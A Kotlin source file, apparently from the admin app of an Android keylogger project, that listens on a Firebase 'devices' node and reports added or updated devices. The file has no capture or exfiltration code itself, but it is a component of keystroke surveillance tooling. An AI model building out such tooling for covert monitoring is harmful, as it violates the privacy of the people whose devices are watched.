package com.shubhamgupta16.realtimekeyloggeradmin.helpers

import android.util.Log
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference

class DeviceConnection(
    private val deviceListener: DeviceListener,
) {
    companion object {
        private const val TAG = "ServerConnection"
    }

    private val rtDB: DatabaseReference = getDbReference()

    private val childEventListener = object : ChildEventListener {
        override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
//                initialize or new device added
            val deviceModel = snapshot.getDeviceModel()
            if (deviceModel != null)
                deviceListener.onDeviceAdded(deviceModel)

        }

        override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
//                Log.d(TAG, "onChildChanged: $snapshot, $previousChildName")
            val deviceModel = snapshot.getDeviceModel()
            if (deviceModel != null)
                deviceListener.onDeviceUpdated(deviceModel)
        }

        override fun onChildRemoved(snapshot: DataSnapshot) {
            Log.d(TAG, "onChildRemoved: $snapshot")
        }

        override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {
            Log.d(TAG, "onChildMoved: $snapshot, $previousChildName")
        }

        override fun onCancelled(error: DatabaseError) {
            Log.d(TAG, "onCancelled: $error")
        }
    }

    init {
        rtDB.child("devices").addChildEventListener(childEventListener)
    }
}

